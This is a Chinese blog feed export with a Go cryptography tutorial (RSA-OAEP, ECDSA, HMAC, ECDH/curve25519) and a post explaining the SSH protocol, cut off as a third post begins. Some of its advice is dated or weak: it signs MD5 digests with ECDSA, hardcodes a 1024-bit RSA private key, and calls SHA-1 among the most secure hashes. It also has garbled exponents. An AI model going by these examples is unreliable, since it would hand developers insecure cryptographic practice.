ECCECC加密的原理依赖椭圆曲线上的难题。今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。随着分解大整数方法的进步及完善、计算机速度的提高以及计算机网络的发展，为了保障数据的安全，RSA的密钥需要不断增加，但是，密钥长度的增加导致了其加解密的速度大为降低，硬件实现也变得越来越难以忍受，这对使用RSA的应用带来了很重的负担，因此需要一种新的算法来代替RSA。1985年N.Koblitz和Miller提出将椭圆曲线用于密码算法，根据是有限域上的椭圆曲线上的点群中的离散对数问题ECDLP。ECDLP是比因子分解问题更难的问题，它是指数级的难度。 ECDSA因为在数字签名的安全性高, 基于ECC的DSA更高, 所以非常适合数字签名使用场景, 在SSH TLS有广泛使用, ECC把离散对数安全性高很少, 所以ECC在安全领域会成为下一个标准。 ECC与RSA的比较ECC和RSA相比，在许多方面都有对绝对的优势，主要体现在以下方面： 抗攻击性强。相同的密钥长度，其抗攻击性要强很多倍。 计算量小，处理速度快。ECC总的速度比RSA、DSA要快得多。 存储空间占用小。ECC的密钥尺寸和系统参数与RSA、DSA相比要小得多，意味着它所占的存贮空间要小得多。这对于加密算法在IC卡上的应用具有特别重要的意义。 带宽要求低。当对长消息进行加解密时，三类密码系统有相同的带宽要求，但应用于短消息时ECC带宽要求却低得多。带宽要求低使ECC在无线网络领域具有广泛的应用前景。 ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。 代码示例ECC是未来的一个趋势, 在IOT行业是一个不错的选择, 但是现在被广泛使用的依然是RSA以下使用RSA进行加解密: 使用对方的公钥加密数据, 然后发给对方, 对方使用自己的私钥解密.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495package mainimport ( "crypto/rand" "crypto/rsa" "crypto/sha1" "crypto/x509" "encoding/pem" "fmt")// 使用对方的公钥的数据, 只有对方的私钥才能解开func encrypt(plain string, publicKey string) (cipherByte []byte, err error) &#123; msg := []byte(plain) // 解码公钥 pubBlock, _ := pem.Decode([]byte(publicKey)) // 读取公钥 pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes) if err != nil &#123; panic(err) &#125; pub := pubKeyValue.(*rsa.PublicKey) // 加密数据方法: 不用使用EncryptPKCS1v15方法加密,源码里面推荐使用EncryptOAEP, 因此这里使用安全的方法加密 encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, nil) if err != nil &#123; panic(err) &#125; cipherByte = encryptOAEP return&#125;// 使用私钥解密公钥加密的数据func decrypt(cipherByte []byte, privateKey string) (plainText string, err error) &#123; // 解析出私钥 priBlock, _ := pem.Decode([]byte(privateKey)) priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes) if err != nil &#123; panic(err) &#125; // 解密RSA-OAEP方式加密后的内容 decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, nil) if err != nil &#123; panic(err) &#125; plainText = string(decryptOAEP) return&#125;func test() &#123; msg := "Content bo be encrypted!" // 获取公钥, 生产环境往往是文件中读取, 这里为了测试方便, 直接生成了. publicKeyData := `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB-----END PUBLIC KEY-----` // 获取私钥 privateKeyData := `-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQABAoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaMZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI89KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrwDPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWOAQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O-----END RSA PRIVATE KEY-----` cipherData, err := encrypt(msg, publicKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("encrypt message: %x\n", cipherData) plainData, err := decrypt(cipherData, privateKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("decrypt message:%s\n", plainData)&#125;func main() &#123; test()&#125; ecdsa正在逐渐成为数字签名的一个标准, 在golang的ssh库中就是使用这个算法来签名的: A使用自己的私钥签名一段数据, 然后将公钥发放出去. 用户拿到公钥后, 验证数据的签名,如果通过则证明数据来源是A, 从而达到身份认证的作用.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "crypto/ecdsa" "crypto/elliptic" "crypto/md5" "crypto/rand" "fmt" "hash" "io" "math/big")// SignData 用于保存签名的数据type SignData struct &#123; r *big.Int s *big.Int signhash *[]byte signature *[]byte&#125;// 使用私钥签名一段数据func sign(message string, privateKey *ecdsa.PrivateKey) (signData *SignData, err error) &#123; // 签名数据 var h hash.Hash h = md5.New() r := big.NewInt(0) s := big.NewInt(0) io.WriteString(h, message) signhash := h.Sum(nil) r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash) if serr != nil &#123; return nil, serr &#125; signature := r.Bytes() signature = append(signature, s.Bytes()...) signData = &amp;SignData&#123; r: r, s: s, signhash: &amp;signhash, signature: &amp;signature, &#125; return&#125;// 校验数字签名func verifySign(signData *SignData, publicKey *ecdsa.PublicKey) (status bool) &#123; status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s) return&#125;func test() &#123; //使用椭圆曲线的P256算法,现在一共也就实现了4种,我们使用折中一种,具体见http://golang.org/pkg/crypto/elliptic/#P256 pubkeyCurve := elliptic.P256() privateKey := new(ecdsa.PrivateKey) // 生成秘钥对 privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader) if err != nil &#123; panic(err) &#125; var publicKey ecdsa.PublicKey publicKey = privateKey.PublicKey // 签名 signData, err := sign("This is a message to be signed and verified by ECDSA!", privateKey) if err != nil &#123; panic(err) &#125; fmt.Printf("The signhash: %x\nThe signature: %x\n", *signData.signhash, *signData.signature) // 验证 status := verifySign(signData, &amp;publicKey) fmt.Printf("The verify result is: %v\n", status)&#125;func main() &#123; test()&#125; 散列算法散列是信息的提炼，通常其长度要比信息小得多，且为一个固定长度。加密性强的散列一定是不可逆的，这就意味着通过散列结果，无法推出任何部分的原始信息。任何输入信息的变化，哪怕仅一位，都将导致散列结果的明显变化，这称之为雪崩效应。散列还应该是防冲突的，即找不出具有相同散列结果的两条信息。具有这些特性的散列结果就可以用于验证信息是否被修改。常用于保证数据完整性单向散列函数一般用于产生消息摘要，密钥加密等，常见的有： MD5(Message Digest Algorithm 5): 是RSA数据安全公司开发的一种单向散列算法。 SHA(Secure Hash Algorithm): 可以对任意长度的数据运算生成一个160位的数值； MD5MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。将数据（如汉字）运算为另一固定长度值，是杂凑算法的基础原理，MD5的前身有MD2、MD3和MD4 SHA-1在1993年，安全散列算法（SHA）由美国国家标准和技术协会(NIST)提出，并作为联邦信息处理标准（FIPS PUB 180）公布；1995年又发布了一个修订版FIPS PUB 180-1，通常称之为SHA-1。SHA-1是基于MD4算法的，并且它的设计在很大程度上是模仿MD4的。现在已成为公认的最安全的散列算法之一，并被广泛使用。SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。该算法输入报文的最大长度不超过264位，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。sha1是SHA家族的五个算法之一(其它四个是SHA-224、SHA-256、SHA-384，和SHA-512) HMacHmac算法也是一种哈希算法，它可以利用MD5或SHA1等哈希算法。不同的是，Hmac还需要一个密钥, 只要密钥发生了变化，那么同样的输入数据也会得到不同的签名，因此，可以把Hmac理解为用随机数“增强”的哈希算法。 SHA-1与MD5的比较因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同： 对强行供给的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。 对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。 速度：在相同的硬件上，SHA-1的运行速度比MD5慢。 代码示例由于MD5已经被破解了(中国山东大学的王小云教授破解), 常用的散列算法是sha家族, 更加安全的算法是使用Hmac123456789101112131415161718192021222324252627282930313233343536package mainimport ( "crypto/hmac" "crypto/sha1" "fmt" "io")// sha1散列算法func sha1Hash(msg string) (hashData []byte) &#123; h := sha1.New() io.WriteString(h, msg) hashData = h.Sum(nil) return&#125;// 使用sha1的Hmac散列算法func hmacHash(msg string, key string) (hashData []byte) &#123; k := []byte(key) mac := hmac.New(sha1.New, k) io.WriteString(mac, msg) hashData = mac.Sum(nil) return&#125;func main() &#123; msg := "This is the message to hash!" // sha1 sha1Data := sha1Hash(msg) fmt.Printf("SHA1: %x\n", sha1Data) // hmac hmacData := hmacHash(msg, "The key string!") fmt.Printf("HMAC: %x\n", hmacData)&#125; 秘钥交换算法一种密钥交换协议，注意该算法只能用于密钥的交换，而不能进行消息的加密和解密。双方确定要用的密钥后，要使用其他对称密钥操作加密算法实际加密和解密消息。它可以让双方在不泄漏密钥的情况下协商出一个密钥来, 常用于保证对称加密的秘钥的安全, TLS就是这样做的。在这个领域应该2种 DH：ECDH是DH的加强版 ECDH: DH算法的加强版, 常用的是NIST系列,但是后面curve25519 curve25519: 实质上也是一种ECDH,但是其实现更为优秀,表现的更为安全,可能是下一代秘钥交换算法的标准。 DHDH全称是:Diffie-Hellman, 是一种确保共享KEY安全穿越不安全网络的方法，它是OAKLEY的一个组成部分。Whitefield与Martin Hellman在1976年提出了一个奇妙的密钥交换协议，称为Diffie-Hellman密钥交换协议/算法(Diffie-Hellman Key Exchange/Agreement Algorithm).这个机制的巧妙在于需要安全通信的双方可以用这个方法确定对称密钥。然后可以用这个密钥进行加密和解密。DH依赖于计算离散对数的难度, 大概过程如下: 可以如下定义离散对数：首先定义一个素数p的原根，为其各次幂产生从1 到p-1的所有整数根，也就是说，如果a是素数p的一个原根，那么数值 a mod p,a2 mod p,…,ap-1 mod p 是各不相同的整数，并且以某种排列方式组成了从1到p-1的所有整数. 对于一个整数b和素数p的一个原根a，可以找到惟一的指数i，使得 b = a^i mod p 其中0 ≤ i ≤ （p-1） 指数i称为b的以a为基数的模p的离散对数或者指数.该值被记为inda,p(b). ECDH全称是Elliptic Curve Diffie-Hellman, 是DH算法的加强版, 基于椭圆曲线难题加密, 现在是主流的密钥交换算法。ECC是建立在基于椭圆曲线的离散对数的难度, 大概过程如下: 给定椭圆曲线上的一个点P，一个整数k，求解Q=kP很容易；给定一个点P、Q，知道Q=kP，求整数k确是一个难题。ECDH即建立在此数学难题之上 椭圆曲线算法因参数不同有多种类型, 这个网站列出了现阶段那些ECC是相对安全的:椭圆曲线算法安全列表, 而curve25519便是其中的佼佼者。Curve25519/Ed25519/X25519是著名密码学家Daniel J. Bernstein在2006年独立设计的椭圆曲线加密/签名/密钥交换算法, 和现有的任何椭圆曲线算法都完全独立。特点是： 完全开放设计: 算法各参数的选择直截了当，非常明确，没有任何可疑之处，相比之下目前广泛使用的椭圆曲线是NIST系列标准，方程的系数是使用来历不明的随机种子 c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 生成的，非常可疑，疑似后门； 高安全性： 一个椭圆曲线加密算法就算在数学上是安全的，在实用上也并不一定安全，有很大的概率通过缓存、时间、恶意输入摧毁安全性，而25519系列椭圆曲线经过特别设计，尽可能的将出错的概率降到了最低，可以说是实践上最安全的加密算法。例如，任何一个32位随机数都是一个合法的X25519公钥，因此通过恶意数值攻击是不可能的，算法在设计的时候刻意避免的某些分支操作，这样在编程的时候可以不使用if ，减少了不同if分支代码执行时间不同的时序攻击概率，相反， NIST系列椭圆曲线算法在实际应用中出错的可能性非常大，而且对于某些理论攻击的免疫能力不高， Bernstein 对市面上所有的加密算法使用12个标准进行了考察， 25519是几乎唯一满足这些标准的 http://t.cn/RMGmi1g ； 速度快: 25519系列曲线是目前最快的椭圆曲线加密算法，性能远远超过NIST系列，而且具有比P-256更高的安全性； 作者功底深厚: Daniel J. Bernstein是世界著名的密码学家，他在大学曾经开设过一门 UNIX 系统安全的课程给学生，结果一学期下来，发现了 UNIX 程序中的 91 个安全漏洞；他早年在美国依然禁止出口加密算法时，曾因为把自己设计的加密算法发布到网上遭到了美国政府的起诉，他本人抗争六年，最后美国政府撤销所有指控，目前另一个非常火的高性能安全流密码 ChaCha20 也是出自 Bernstein 之手； 下一代的标准: 25519系列曲线自2006年发表以来，除了学术界无人问津， 2013 年爱德华·斯诺登曝光棱镜计划后，该算法突然大火，大量软件，如OpenSSH都迅速增加了对25519系列的支持，如今25519已经是大势所趋，可疑的NIST曲线迟早要退出椭圆曲线的历史舞台，目前， RFC增加了SSL/TLS对X25519密钥交换协议的支持，而新版 OpenSSL 1.1也加入支持，是摆脱老大哥的第一步，下一步是将 Ed25519做为可选的TLS证书签名算法，彻底摆脱NIST 代码示例这里需要指出下golang的标准库的crypto里的椭圆曲线实现了这4种(elliptic文档): P224/P256/P384/P521, 而curve25519是单独实现的, 他不在标准库中: golang.org/x/crypto/curve25519123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212package mainimport ( "crypto" "crypto/elliptic" "crypto/rand" "fmt" "io" "math/big" "golang.org/x/crypto/curve25519")// ECDH 秘钥交换算法的主接口type ECDH interface &#123; GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) Marshal(crypto.PublicKey) []byte Unmarshal([]byte) (crypto.PublicKey, bool) GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]byte, error)&#125;type ellipticECDH struct &#123; ECDH curve elliptic.Curve&#125;type ellipticPublicKey struct &#123; elliptic.Curve X, Y *big.Int&#125;type ellipticPrivateKey struct &#123; D []byte&#125;// NewEllipticECDH 指定一种椭圆曲线算法用于创建一个ECDH的实例// 关于椭圆曲线算法标准库里面实现了4种: 见crypto/ellipticfunc NewEllipticECDH(curve elliptic.Curve) ECDH &#123; return &amp;ellipticECDH&#123; curve: curve, &#125;&#125;// GenerateKey 基于标准库的NIST椭圆曲线算法生成秘钥对func (e *ellipticECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var d []byte var x, y *big.Int var priv *ellipticPrivateKey var pub *ellipticPublicKey var err error d, x, y, err = elliptic.GenerateKey(e.curve, rand) if err != nil &#123; return nil, nil, err &#125; priv = &amp;ellipticPrivateKey&#123; D: d, &#125; pub = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return priv, pub, nil&#125;// Marshal用于公钥的序列化func (e *ellipticECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*ellipticPublicKey) return elliptic.Marshal(e.curve, pub.X, pub.Y)&#125;// Unmarshal用于公钥的反序列化func (e *ellipticECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var key *ellipticPublicKey var x, y *big.Int x, y = elliptic.Unmarshal(e.curve, data) if x == nil || y == nil &#123; return key, false &#125; key = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return key, true&#125;// GenerateSharedSecret 通过自己的私钥和对方的公钥协商一个共享密码func (e *ellipticECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; priv := privKey.(*ellipticPrivateKey) pub := pubKey.(*ellipticPublicKey) x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D) return x.Bytes(), nil&#125;// NewCurve25519ECDH 使用密码学家Daniel J. Bernstein的椭圆曲线算法:Curve25519来创建ECDH实例// 因为Curve25519独立于NIST之外, 没在标准库实现, 需要单独为期实现一套接口来支持ECDHfunc NewCurve25519ECDH() ECDH &#123; return &amp;curve25519ECDH&#123;&#125;&#125;type curve25519ECDH struct &#123; ECDH&#125;// GenerateKey 基于curve25519椭圆曲线算法生成秘钥对func (e *curve25519ECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var pub, priv [32]byte var err error _, err = io.ReadFull(rand, priv[:]) if err != nil &#123; return nil, nil, err &#125; priv[0] &amp;= 248 priv[31] &amp;= 127 priv[31] |= 64 curve25519.ScalarBaseMult(&amp;pub, &amp;priv) return &amp;priv, &amp;pub, nil&#125;// 实现公钥的序列化func (e *curve25519ECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*[32]byte) return pub[:]&#125;// 实现公钥的反序列化func (e *curve25519ECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var pub [32]byte if len(data) != 32 &#123; return nil, false &#125; copy(pub[:], data) return &amp;pub, true&#125;// 实现秘钥协商接口func (e *curve25519ECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; var priv, pub, secret *[32]byte priv = privKey.(*[32]byte) pub = pubKey.(*[32]byte) secret = new([32]byte) curve25519.ScalarMult(secret, priv, pub) return secret[:], nil&#125;func test(e ECDH) &#123; var privKey1, privKey2 crypto.PrivateKey var pubKey1, pubKey2 crypto.PublicKey var pubKey1Buf, pubKey2Buf []byte var err error var ok bool var secret1, secret2 []byte // 准备2对秘钥对,A: privKey1,pubKey1 B:privKey2,pubKey2 privKey1, pubKey1, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; privKey2, pubKey2, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; pubKey1Buf = e.Marshal(pubKey1) pubKey2Buf = e.Marshal(pubKey2) pubKey1, ok = e.Unmarshal(pubKey1Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; pubKey2, ok = e.Unmarshal(pubKey2Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; // A 通过B给的公钥协商共享密码 secret1, err = e.GenerateSharedSecret(privKey1, pubKey2) if err != nil &#123; fmt.Println(err) &#125; // B 通过A给的公钥协商共享密码 secret2, err = e.GenerateSharedSecret(privKey2, pubKey1) if err != nil &#123; fmt.Println(err) &#125; // A B在没暴露直接的私钥的情况下, 协商出了一个共享密码 fmt.Printf("The secret1 shared keys: %x\n", secret1) fmt.Printf("The secret2 shared keys: %x\n", secret2)&#125;func main() &#123; e1 := NewEllipticECDH(elliptic.P521()) e2 := NewCurve25519ECDH() test(e1) test(e2)&#125; 总体结论以上综述了两种加密方法的原理，总体来说主要有下面几个方面的不同： 管理方面：公钥密码算法只需要较少的资源就可以实现目的，在密钥的分配上，两者之间相差一个指数级别（一个是n一个是n2）。所以私钥密码算法不适应广域网的使用，而且更重要的一点是它不支持数字签名。 安全方面：由于公钥密码算法基于未解决的数学难题，在破解上几乎不可能。对于私钥密码算法，到了AES虽说从理论来说是不可能破解的，但从计算机的发展角度来看。公钥更具有优越性。 速度上来看：AES的软件实现速度已经达到了每秒数兆或数十兆比特。是公钥的100倍，如果用硬件来实现的话这个比值将扩大到1000倍。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[跳板机系列(二)-ssh协议原理简介]]></title>
      <url>%2F2017%2F02%2F16%2Fssh-protocol%2F</url>
      <content type="text"><![CDATA[SSH对于大多数人来说应该并不陌生, 无论你是开发还是测试还是运维, 只要你需要登录类Unix服务器都会用到, 他被用来提供链接的安全保障, 比如常见的客户端有命令行工具ssh, 以及周边的商业工具Xshell等。在这篇文章里我们不会教你如何使用xshell, 而是从协议层面全新的认识下ssh。 背景虽然SSH使用起来很简单, 但是背后的原理特别不简单,关于以下问题, 你能否知晓其细节: SSH如何保证客户端与服务端通行的安全 SSH采用什么加密协议 SSH是通过对称加密还是非对称加密数据在传输过程的安全 SSH如何保证数据完整性 SSH的密码认证方式和密钥认证方式分别如何实现，有何差异 简介SSH全称Secure Shell是一种工作在应用层和传输层上的安全协议，能在非安全通道上建立安全通道。提供身份认证、密钥更新、数据校验、通道复用等功能，同时具有良好的可扩展性,由芬兰赫尔辛基大学研究员Tatu Ylönen,于1995年提出，其目的是用于替代非安全的Telnet、rsh、rexec等远程Shell协议。之后SSH发展了两个大版本,SSH-1和SSH-2, 开源实现OpenSSH对2者都支持。SSH的主要特性: 加密: 避免数据内容泄漏 通信的完整性: 避免数据被篡改，以及发送或接受地址伪装(检查数据是否被篡改，数据是否来自发送者而非攻击者） SSH-2通过MD5和SHA-1实现该功能，SSH-1使用CRC-32 认证: 识别数据发送者和接收者身份 客户端验证SSH服务端的身份：防止攻击者仿冒SSH服务端身份，避免中介人攻击和重定向请求的攻击；OpenSSH通过在know-hosts中存储主机名和host key对服务端身份进行认证 服务端验证请求者身份：提供安全性较弱的用户密码方式，和安全性更强的per-user public-key signatures；此外SSH还支持与第三方安全服务系统的集成，如Kerberos等 授权: 用户访问控制 安全隧道: 转发或者为基于TCP/IP的回话提供加密隧道, 比如通过SSH为Telnet、FTP等提供通信安全保障，支持三种类型的Forwarding操作：Port Forwarding；X Forwarding；Agent Forwarding 通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。 安全相关在SSH中涉及到很多加密算法, 关于加密算法的相关知识之前已经写过一遍博客做专门介绍:密码学简介与Golang的加密库Crypto的使用, 以下是一个总结性的描述: 对称加密: 高效，但安全性相对较低，Key的分发尤其不方便, 主要用于数据传输的加密(session加密), 常用AES系列 非对称加密: 安全，但效率低，不适合大规模进行数据的加密和解密操作, 主要用于秘钥交换算法过程中用来协商Key和在数字签名时用来验证身份, 常用的是RSA/ECDSA 秘钥交换算法: 用于协商对称加密的密码, ECDH用的比较多 散列算法: 用于确保数据传输过程中的完整性, 为了安全一般使用Hmac在golang的ssh包中使用ECDH的cure25519的进行密码的交换, 交换后的密码使用AES来加密数据. 如果使用密钥登录的话,一般使用ECDSA进行数字签名. 协议组成从上图中可以看出SSH主要有三部分组成: 传输层协议, 用户认证协议, 连接协议 传输层协议[SSH-TRANS]也叫:The Transport Layer Protocol, 提供了服务器认证，保密性及完整性。此外它有时还提供压缩功能。 SSH-TRANS通常运行在TCP/IP连接上，也可能用于其它可靠数据流上。 SSH-TRANS提供了强力的加密技术、密码主机认证及完整性保护。该协议中的认证基于主机，并且该协议不执行用户认证。更高层的用户认证协议可以设计为在此协议之上。 用户认证协议[SSH-USERAUTH]也叫:The User Authentication Protocol, 用于向服务器提供客户端用户鉴别功能。它运行在传输层协议SSH-TRANS上面。当SSH-USERAUTH开始后，它从低层协议那里接收会话标识符(从第一次密钥交换中的交换哈希H). 会话标识符唯一标识此会话并且适用于标记以证明私钥的所有权。 SSH-USERAUTH也需要知道低层协议是否提供保密性保护。 连接协议[SSH-CONNECT]也叫: The Connection Protocol, 将多个加密隧道分成逻辑通道。它运行在用户认证协议上。它提供了交互式登录话路、远程命令执行、转发TCP/IP连接和转发X11连接。各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。 工作过程这张图描述了ssh交换的整个过程: Client端向Server端发起SSH连接请求。 Server端向Client端发起版本协商。 协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。 Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。 进入认证阶段。从此以后所有通信均加密。 认证成功后，进入交互阶段。 针对这项阶段发生在协成的那一部分有一个简单的总结: 发生在传输层的: 版本协商和算法协商. 发生在用户认证层的: 用户认证. 发生在链接层的: 回话交互 版本协商 服务器监听22端口，等待客户端连接。 客户端向服务器端发起TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开TCP连接。 因为版本协商发生在为加密之前, 所以版本协商是明文的 算法协商 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC(Message Authentication Code，消息验证码)算法列表、压缩算法列表等; 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。 服务器端和客户端利用ECDH交换算法、主机密钥对等参数，生成会话密钥和会话ID。 通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID, 用于加密传输的数据, 到此链接加密完成。 用户认证 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。 客户端从认证方法列表中选取一种认证方法再次进行认证。 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。 用户认证是在加密过会进行的, 所以用于认证的数据是不会暴露的,通常而言SSH提供2认证方式: password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。 publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息SSH2.0还提供了 password-publickey 认证和 any 认证: password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。 any认证：指定该用户的认证方式可以是 password，也可以是 publickey。 一般而言默认使用的any。这张图描述了在加密过程上的认证: 会话交互会话请求阶段： 服务器等待客户端的请求； 认证通过后，客户端向服务器发送会话请求； 服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。 交互会话阶段，在这个模式下，数据被双向传送: 客户端将要执行的命令加密后传给服务器; 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端; 客户端将接收到的结果解密后显示到终端上.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[跳板机系列(一)-架构与简介]]></title>
      <url>%2F2017%2F02%2F15%2Fgo-ssh%2F</url>
